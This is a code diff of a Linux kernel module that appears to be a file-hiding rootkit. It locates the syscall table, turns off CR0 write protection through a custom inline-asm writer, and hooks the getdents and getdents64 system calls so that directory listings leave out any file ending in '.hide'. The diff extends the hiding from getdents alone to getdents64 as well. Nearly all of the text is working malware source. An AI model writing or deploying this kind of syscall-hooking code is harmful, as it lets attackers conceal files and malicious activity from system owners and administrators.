@@ -3,43 +3,85 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
-#include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <asm/paravirt.h>
 
 MODULE_LICENSE("GPL");
 
+// Definitions
+
 #define HIDE_EXT ".hide"
 #define EXT_LEN (sizeof(HIDE_EXT) - 1)
-#define DIRENT_PART_SIZE (2* sizeof(unsigned long) + sizeof(unsigned short)) // size of the first 3 linux_dirent fields
+
+// The size of the first 3 linux_dirent fields.
+// It should be equal to the size of the first 3 linux_dirent64 fields on x86_64.
+#define DIRENT_PART_SIZE (2 * sizeof(unsigned long) + sizeof(unsigned short))
 
 struct linux_dirent {
     unsigned long   d_ino;
     unsigned long   d_off;
     unsigned short  d_reclen;
-    char            d_name[1];
+    char        d_name[1];
 };
 
+struct linux_dirent64 {
+    u64     d_ino;
+    s64     d_off;
+    unsigned short  d_reclen;
+    unsigned char   d_type;
+    char        d_name[0];
+};
+
+typedef enum {
+    X32,
+    X64
+} bitness_enum;
+
+typedef asmlinkage long (*sys_getdents_t)(const struct pt_regs *regs);
+
+// Definitions end
+
+
+// Global variables
+
 unsigned long *sys_call_table = NULL;
-asmlinkage long (*original_getdents)(const struct pt_regs *regs);
+sys_getdents_t original_getdents, original_getdents64;
+
+// Global variables end
+
+
+inline void custom_write_cr0(unsigned long cr0) {
+    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
+}
 
 inline void disable_write_protect(void) {
-    write_cr0(read_cr0() & (~0x10000));
+    custom_write_cr0(read_cr0() & (~ 0x10000));
 }
 
 inline void enable_write_protect(void) {
-    write_cr0(read_cr0() | 0x10000);
+    custom_write_cr0(read_cr0() | 0x10000);
 }
 
-asmlinkage long getdents_hook(const struct pt_regs *regs) {
+long filter_dirp(const struct pt_regs *regs, sys_getdents_t getdents_func, bitness_enum bitness) {
+    // dirp, filtered_dirp, last_filtered and temp_dirp could point to a linux_dirent (bitness = X32)
+    // or linux_dirent64 (bitness = X64) struct. Because of the first 3 fields of linux_dirent and
+    // linux_dirent64have the same size and use we just use linux_dirent in all cases.
+    // We use name_offset to get d_name value properly.
     struct linux_dirent *dirp, *filtered_dirp, *last_filtered, *temp_dirp;
-    size_t name_len;
+    size_t name_len, name_offset;
     unsigned long copy_res;
     long orig_bytes_read, res_bytes_read, remaining_bytes;
+    char *d_name;
 
-    orig_bytes_read = original_getdents(regs);
+    orig_bytes_read = getdents_func(regs);
     if (orig_bytes_read <= 0) {
         return orig_bytes_read;
+    }
+
+    if (bitness == X64) {
+        name_offset = sizeof(unsigned char); // size of d_type field
+    } else {
+        name_offset = 0;
     }
 
     dirp = (struct linux_dirent *) regs->si;
@@ -57,12 +99,16 @@ asmlinkage long getdents_hook(const struct pt_regs *regs) {
     res_bytes_read = orig_bytes_read;
     while (remaining_bytes > 0) {
         if (temp_dirp->d_reclen <= 0) {
-            printk(KERN_ALERT "linux_dirent struct bad size: %hu", temp_dirp->d_reclen);
+            printk(KERN_ALERT "linux_dirent/linux_dirent64 struct bad size: %hu", temp_dirp->d_reclen);
             break;
         }
 
-        name_len = strnlen(temp_dirp->d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);
-        if (strcmp(HIDE_EXT, temp_dirp->d_name + name_len - EXT_LEN) == 0) {
+        // Get d_name depending on the bitness
+        // See linux_dirent and linux_dirent64 definitions
+        d_name = &temp_dirp->d_name[name_offset];
+        name_len = strnlen(d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);
+
+        if (strcmp(HIDE_EXT, d_name + name_len - EXT_LEN) == 0) {
             res_bytes_read -= temp_dirp->d_reclen;
         } else {
             if (last_filtered != temp_dirp) {
@@ -82,13 +128,24 @@ asmlinkage long getdents_hook(const struct pt_regs *regs) {
 
     kfree(filtered_dirp);
     return res_bytes_read;
+
+}
+
+asmlinkage long getdents_hook(const struct pt_regs *regs) {
+    return filter_dirp(regs, original_getdents, X32);
+}
+
+asmlinkage long getdents64_hook(const struct pt_regs *regs) {
+    return filter_dirp(regs, original_getdents64, X64);
 }
 
 static int __init hide_files_init(void) {
     sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
     original_getdents = (void *) sys_call_table[__NR_getdents];
+    original_getdents64 = (void *) sys_call_table[__NR_getdents64];
     disable_write_protect();
     sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
+    sys_call_table[__NR_getdents64] = (unsigned long) getdents64_hook;
     enable_write_protect();
     return 0;
 }
@@ -96,6 +153,7 @@ static int __init hide_files_init(void) {
 static void __exit hide_files_exit(void) {
     disable_write_protect();
     sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
+    sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
     enable_write_protect();
 }
 
